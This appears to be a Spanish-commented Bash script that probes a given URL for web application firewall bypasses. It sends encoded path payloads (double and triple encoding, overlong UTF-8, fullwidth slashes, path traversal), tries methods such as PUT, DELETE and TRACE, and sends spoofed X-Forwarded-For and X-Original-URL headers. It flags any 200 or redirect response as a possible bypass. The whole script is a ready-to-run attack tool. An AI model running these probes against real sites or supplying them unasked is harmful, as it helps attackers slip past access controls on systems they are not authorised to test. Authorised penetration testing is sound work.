#!/bin/bash
# WAF Bypass Tester - Unicode Encoding
# Compatible con Bash 1.0.x
# Uso: ./wafbypass.sh http://ejemplo.com/path

# Colores básicos (sin códigos ANSI complejos)
RED=''
GREEN=''
BLUE=''
NC='' # Sin color

# Verificar argumentos
if [ "$#" -ne 1 ]; then
    echo "Uso: $0 <URL>"
    echo "Ejemplo: $0 http://ejemplo.com/admin"
    exit 1
fi

URL=$1

# Directorio para archivos temporales
TMP_DIR="/tmp/waf_test_$$"
mkdir -p "$TMP_DIR"

# Función para limpieza al salir
cleanup() {
    rm -rf "$TMP_DIR"
    exit 0
}

trap cleanup INT TERM

# Funciones de prueba
test_url() {
    local test_url="$1"
    local test_name="$2"

    # Usar curl si está disponible, sino wget
    if command -v curl >/dev/null 2>&1; then
        response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$test_url" 2>/dev/null)
    elif command -v wget >/dev/null 2>&1; then
        response=$(wget --spider --server-response --timeout=10 "$test_url" 2>&1 | grep "HTTP/" | tail -1 | awk '{print $2}')
    else
        echo "Error: Se necesita curl o wget"
        exit 1
    fi

    if [ "$response" = "200" ] || [ "$response" = "301" ] || [ "$response" = "302" ]; then
        echo "[+] $test_name - POSIBLE BYPASS (Código: $response)"
        echo "    URL: $test_url" >> "$TMP_DIR/success.txt"
    else
        echo "[-] $test_name - Bloqueado (Código: ${response:-Timeout})"
    fi
}

echo "=== Probando bypass WAF con Unicode ==="
echo "URL objetivo: $URL"
echo ""

# 1. Unicode normalización
echo "--- Pruebas de Unicode Normalización ---"
test_url "$URL%2f" "Barra normal Unicode"
test_url "$URL%252f" "Doble encoding"
test_url "$URL%c0%af" "UTF-8 sobrelargo /"
test_url "$URL%ef%bc%8f" "Fullwidth slash"

# 2. Caracteres Unicode especiales
echo ""
echo "--- Caracteres Unicode Especiales ---"
test_url "$URL%u002f" "Unicode 16-bit"
test_url "$URL%2F" "Mayúscula"
test_url "$URL./" "Punto + slash"

# 3. Path traversal con Unicode
echo ""
echo "--- Path Traversal Unicode ---"
test_url "$URL/..%c0%af" "Directory traversal 1"
test_url "$URL/..%ef%bc%8f" "Directory traversal 2"
test_url "$URL%2e%2e%2f" "Dots encoded"

# 4. Encoding múltiple
echo ""
echo "--- Encoding Múltiple ---"
test_url "$URL%25252f" "Triple encoding"
test_url "$URL%%32%66" "Nested encoding"

# 5. Variantes de URL
echo ""
echo "--- Variantes de URL ---"
test_url "${URL}?" "Query vacía"
test_url "${URL}#" "Fragmento vacío"
test_url "${URL}/." "Terminación con punto"

# 6. Métodos HTTP alternativos
echo ""
echo "--- Probando con diferentes métodos ---"
if command -v curl >/dev/null 2>&1; then
    for method in GET POST PUT DELETE PATCH TRACE; do
        response=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" --max-time 10 "$URL" 2>/dev/null)
        if [ "$response" = "200" ] || [ "$response" = "301" ] || [ "$response" = "302" ]; then
            echo "[+] Método $method - Permitido ($response)"
        fi
    done
fi

# 7. Headers especiales
echo ""
echo "--- Headers Especiales ---"
if command -v curl >/dev/null 2>&1; then
    # X-Forwarded-For con encoding
    response=$(curl -s -o /dev/null -w "%{http_code}" -H "X-Forwarded-For: 127.0.0.1" --max-time 10 "$URL" 2>/dev/null)
    echo "[-] X-Forwarded-For básico: ${response:-N/A}"

    # X-Original-URL
    response=$(curl -s -o /dev/null -w "%{http_code}" -H "X-Original-URL: $URL" --max-time 10 "$URL" 2>/dev/null)
    echo "[-] X-Original-URL: ${response:-N/A}"
fi

# Resumen
echo ""
echo "=== Resumen ==="
if [ -f "$TMP_DIR/success.txt" ]; then
    echo "Posibles bypasses encontrados:"
    cat "$TMP_DIR/success.txt"
else
    echo "No se encontraron bypasses obvios."
fi

echo 

# Limpiar
cleanup
